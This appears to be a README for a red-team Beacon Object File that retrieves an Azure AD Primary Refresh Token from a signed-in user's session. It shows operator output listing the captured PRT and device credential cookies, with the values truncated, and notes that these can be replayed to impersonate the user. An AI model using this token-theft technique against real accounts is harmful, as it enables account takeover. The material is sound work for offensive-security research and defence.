# Overview
This BOF obtains an AAD PRT for a user who is signed into Windows with their AAD credentials on a domain-joined machine. With this PRT, the resulting x-ms-RefreshTokenCredential JWT can then be used to authenticate to AAD on behalf of that user, for example with [ROADtools](https://github.com/dirkjanm/ROADtools). This proof-of-concept, originally inspired by [Abusing Azure AD SSO with the Primary Refresh Token](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/), has been modified to pre-generate the nonce and retrieve a PRT all in one, rather than relying on roadrecon to retrieve it and then using that nonce to request a PRT.

```
[17/12/2024 23:20:57] (finished) operator > exec_bof
[*] Running BOF with name "request_aad_prt.x64.o"

[+] Starting AAD PRT request process
[+] Response size: 39412
[+] Starting PRT request with nonce
[+] Found 3 cookies:
Cookie 1:
  Name: x-ms-DeviceCredential
  Data: eyJhbGciOiJS<snip>4uxiG-A; path=/; domain=login.microsoftonline.com; secure; httponly
  Flags: 0x2040
  P3PHeader: CP="CAO DSP COR ADMa DEV CONo TELo CUR PSA PSD TAI IVDo OUR SAMi BUS DEM NAV STA UNI COM INT PHY ONL FIN PUR LOCi CNT"
Cookie 2:
  Name: x-ms-RefreshTokenCredential
  Data: eyJrZGZf<snip>gms-IlY; path=/; domain=login.microsoftonline.com; secure; httponly
  Flags: 0x2040
  P3PHeader: CP="CAO DSP COR ADMa DEV CONo TELo CUR PSA PSD TAI IVDo OUR SAMi BUS DEM NAV STA UNI COM INT PHY ONL FIN PUR LOCi CNT"
Cookie 3:
  Name: x-ms-DeviceCredential1
  Data: eyJ4NWMiO<snip>3ycSw; path=/; domain=login.microsoftonline.com; secure; httponly
  Flags: 0x2040
  P3PHeader: CP="CAO DSP COR ADMa DEV CONo TELo CUR PSA PSD TAI IVDo OUR SAMi BUS DEM NAV STA UNI COM INT PHY ONL FIN PUR LOCi CNT"
[+] AAD PRT request completed
```

# References
* https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/
* https://github.com/dirkjanm/ROADtoken
* https://github.com/leechristensen/RequestAADRefreshToken
* https://github.com/trustedsec/CS-Situational-Awareness-BOF